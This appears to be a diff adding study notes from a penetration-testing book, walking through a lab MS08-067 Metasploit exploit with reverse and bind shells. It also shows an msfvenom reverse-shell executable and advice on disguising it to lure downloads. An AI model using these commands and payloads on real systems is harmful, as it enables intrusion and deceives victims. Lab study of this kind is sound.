@@ -1,0 +1,129 @@
+root@kali:~# service postgresql start
+root@kali:~# service metasploit start
+root@kali:~# msfconsole
+
+Explore: (http://www.rapid7.com/db/modules/
+Find some vunerability related to Ubuntu	
+
+Try Built-in search
+msf > search ms08-067
+
+Once you’ve identified a module to use, enter the info command with the module name, example:
+
+msf > info exploit/windows/smb/ms08_067_netapi
+Read page 92, how to interpret the module information
+
+tell Metasploit to use this module with the command use windows/smb/ms08_067_netapi. 
+
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) >
+
+You have chosen our exploit, you need to give Metasploit some information:
+msf exploit(ms08_067_netapi) > show options
+
+Learn RHOST, RPORT and SMBPIPE, Refer Page 94
+
+To check which target you can use with ms08_067_netapi: 
+msf exploit(ms08_067_netapi) > show targets
+The default target is 0 i.e. Automatic Targeting
+
+Payloads (or Shellcode): tell our exploit what to do once the target has been exploited. One of the ways that Metasploit makes things easier is by setting up our payloads for us. 
+
+Finding Compatible Payloads:
+msf exploit(ms08_067_netapi) > show payloads
+
+If you forget to set a payload, you may find that, miraculously, the exploit module will just choose the default payload and associated settings and run it anyway. 
+
+A Test Run with the default payload options: 
+msf exploit(ms08_067_netapi) > exploit
+
+In the default options, Metasploit uses the port 4444. 
+
+Meterpreter is short for meta-interpreter, Metasploit’s unique payload. I often describe it as a shell on steroids. It can do everything a command shell can do and much, much more. We’ll cover Meterpreter in depth in Chapter 13, but to get a head start, enter help in the Meterpreter console for a list of Meterpreter’s
+commands. 
+
+We shall not use meterpreter, thus say goodby and lets learn manual load setting:
+meterpreter > exit
+
+Learn Types of Shells (BIND SHELL AND REVERSE SHELL)
+
+Setting a Payload Manually: 
+msf exploit(ms08_067_netapi) > sset RHOST <IP-ADDRESS-OF-WINDOW> 
+msf exploit(ms08_067_netapi) > set RPORT 445 
+msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
+
+
+Because ABOVE is a reverse shell, we need to tell the target where to send the shell; specifically, we need to give it the IP address of the attack machine and the port we will listen on. 
+
+msf exploit(ms08_067_netapi) > show options
+
+Notice LHOST , It is your Kali system from where you are attacking, set your IP. Just use the default LPORT, so do nothing for the LPORT. 
+
+Now we are ready to exploit
+msf exploit(ms08_067_netapi) > exploit
+
+
+
+When we enter exploit, Metasploit opens a listener on port 4444 to catch the reverse shell from the target u. Then, since
+we kept the target as the default Automatic Targeting, Metasploit fingerprinted the remote SMB server and selected the appropriate exploit target for us v. Once it selected the exploit, Metasploit sent over the exploit string and attempted to take control of the target machine and execute our selected payload. Because the exploit succeeds, a command shell was caught by our handler.
+
+-----------------------------------------------------------------------------------------------------------------
+
+Msfcli 
+
+The command line interface, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts and for testing Metasploit modules that you’re developing because it lets you run a module with a quick, one-line command. 
+
+root@kali:~# msfcli -h
+
+
+we can tell Metasploit everything it needs to know to run our exploit in just one command. 
+
+Let’s use our MS08-067 exploit against our Windows XP target again.
+According to the help page, we need to pass Msfcli the exploit name we want to use and set all our options u. To show the available options use the O mode. Enter msfcli windows/smb/ms08_067_netapi O to see the options for the MS08-067 exploit module
+
+root@kali:~# msfcli windows/smb/ms08_067_netapi O
+
+For a reminder of the payloads compatible with this module, use the P mode. 
+root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=<IP-ADDRESS-OF-WINDOW> P
+
+
+Let's use a bind shell. Because our bind shell won’t be calling back to our attack machine, we don’t need to set the LHOST option, and we can leave the LPORT option as the default of 4444 for now. 
+
+root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=<IP-ADDRESS-OF-WINDOW> PAYLOAD=windows/shell_bind_tcp E
+
+-----------------------------------------------------------------------------------------------------------------
+
+Book Link: https://www.tsoungui.fr/ebooks/Penetration%20Testing%20-%20A%20hands-on%20introduction%20to%20Hacking.pdf
+
+-----------------------------------------------------------------------------------------------------------------
+
+Instead of relying on a missing patch or other security
+issue, we are hoping to exploit the one security issue that may never be fully patched: the users. Msfvenom allows you to build standalone payloads to run on a target system in an attempt to exploit the user whether through a social-engineering attack (Chapter 11) or by uploading a payload to a vulnerable server, as we’ll see in Chapter 8. 
+
+ root@kali:~#msfvenom -h
+ To list all the available payloads, enter
+ root@kali:~#msfvenom -l payloads
+ 
+ root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
+
+our LHOST needs to be set, and our LPORT is set to the default
+4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see EXITFUNC, which we can leave as the default. Because this is a reverse connection payload, we need to set our LHOST option to tell the target machine where to connect back to (our Kali machine). 
+
+Now tell Msfvenom which output format to use. To see all available output formats, enter 
+root@kali:~# msfvenom --help-formats.
+
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe
+
+verify:
+root@kali:~# file chapter4example.exe
+
+One good way to serve up payloads is to host them on a web server, disguise them as something useful, and lure users into downloading them. For this example, we’ll host our Metasploit executable on our Kali machine’s builtin Apache server and browse to the file from our target machine. 
+
+First, run cp chapter4example.exe /var/www to copy the payload executable to the Apache directory, and then make sure the web server is started with service apache2 start.
+
+root@kali:~# cp chapter4example.exe /var/www
+root@kali:~# service apache2 start
+
+
+Now switch to your Windows XP target and open Internet Explorer.
+Browse to http://kali/chapter4example.exe and download the file.
